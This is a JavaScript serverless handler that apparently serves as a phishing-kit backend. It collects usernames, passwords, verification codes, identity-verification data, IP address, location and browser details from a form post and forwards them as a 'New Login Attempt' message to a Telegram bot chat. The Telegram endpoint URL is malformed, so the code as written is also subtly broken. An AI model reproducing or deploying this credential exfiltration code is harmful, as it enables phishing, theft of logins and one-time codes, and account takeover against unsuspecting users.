export default async function handler(req, res) {
    // 1. Only allow secure POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed. Use POST.' });
    }

    // 2. Extract input fields and system metadata from the request body
    const { 
        username, 
        password, 
        verification_code, 
        identity_verification, 
        time_date, 
        remote_ip, 
        location, 
        browser 
    } = req.body;

    // 3. Build a cleanly formatted text message layout for Telegram
    const message = `
🔐 *New Login Attempt Received*
───────────────────
👤 *User Name:* \`${username || 'N/A'}\`
🔑 *Password:* \`${password || 'N/A'}\`
🔢 *Verification Code:* \`${verification_code || 'N/A'}\`
🆔 *Identity Verification:* \`${identity_verification || 'N/A'}\`

🌐 *Network Metadata*
───────────────────
📍 *Remote IP:* \`${remote_ip || 'N/A'}\`
🌍 *Location:* \`${location || 'N/A'}\`
📅 *Timestamp:* \`${time_date || 'N/A'}\`
🖥️ *Browser / User-Agent:* 
_${browser || 'N/A'}_
`;

    // 4. Retrieve keys safely from your Vercel project environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const telegramUrl = `https://telegram.org{botToken}/sendMessage`;

    try {
        // 5. Fire the HTTP POST request to Telegram's official API
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            }),
        });

        const data = await response.json();
        
        // Handle API failures or rejections from Telegram
        if (!response.ok || !data.ok) {
            return res.status(500).json({ error: data.description || 'Telegram API rejected the request.' });
        }

        // Return a successful JSON response back to your website frontend
        return res.status(200).json({ success: true, status: 'Message forwarded successfully.' });
    } catch (err) {
        return res.status(500).json({ error: 'Internal system routing breakdown.' });
    }
}
